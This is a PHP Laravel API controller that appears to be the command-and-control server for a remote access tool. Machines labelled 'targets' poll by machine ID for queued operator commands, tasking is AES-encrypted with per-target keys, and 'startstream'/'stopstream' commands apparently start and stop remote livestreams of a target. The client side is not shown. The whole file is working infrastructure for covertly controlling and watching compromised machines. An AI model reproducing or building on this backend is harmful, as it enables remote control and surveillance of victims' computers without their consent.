<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Command;
use App\Models\Livestream;
use App\Models\Target;
use Illuminate\Http\Request;

class CommandController extends Controller
{
    public function getNewCommands(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['id'])->first();
        if (!$target)
        {
            return response()->json([
                'status' => 'success',
                'message' => 'success',
                'data' => null
            ]);
        }

        // Mettre à jour le timestamp d'activité (updated_at) pour que la target reste "Active"
        $target->touch();

        $newCommands = Command::where('target_id', $data['id'])
            ->where('read', false)
            ->get();

        foreach ($newCommands as $command)
        {
            $command->read = true;
            $command->save();
        }

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $newCommands->map(function($command) use ($target) {
                return [
                    'id' => base64_encode(openssl_encrypt(
                        $command->id,
                        'AES-256-CBC',
                        $target->key,
                        OPENSSL_RAW_DATA,
                        $target->iv
                    )),
                    'command' => $command->command,
                    'extra' => $command->extra
                ];
            })
        ]);
    }

    public function postCommand(Request $request)
    {
        $data = $request->validate([
            'target' => 'required|string',
            'command' => 'required|string',
            'extra' => 'sometimes'
        ]);

        $target = Target::where('machine_id', $data['target'])->first();
        if (!$target) 
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'Target does not exist',
                'data' => null
            ]);
        }

        $stream = null;
        if ($data['command'] === 'startstream')
        {
            $stream = Livestream::create([
                'target_id' => $data['target']
            ]);
            $data['extra'] = $stream->id;
        }
        else if ($data['command'] === 'stopstream')
        {
            $stopStream = Livestream::where('id', $data['extra'])->first();
            if ($stopStream)
            {
                $stopStream->ended_at = now();
                $stopStream->save();
            }
        }

        $data['target_id'] = $data['target'];
        unset($data['target']);

        $data['command'] = base64_encode(openssl_encrypt(
            $data['command'],
            'AES-256-CBC',
            $target->key,
            OPENSSL_RAW_DATA,
            $target->iv
        ));
        $data['read'] = false;
        if (isset($data['extra'])) 
        {
           $data['extra'] = base64_encode(openssl_encrypt(
                $data['extra'],
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            )); 
        }

        Command::create($data);

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $stream === null ? null : $stream->id
        ]);
    }
}
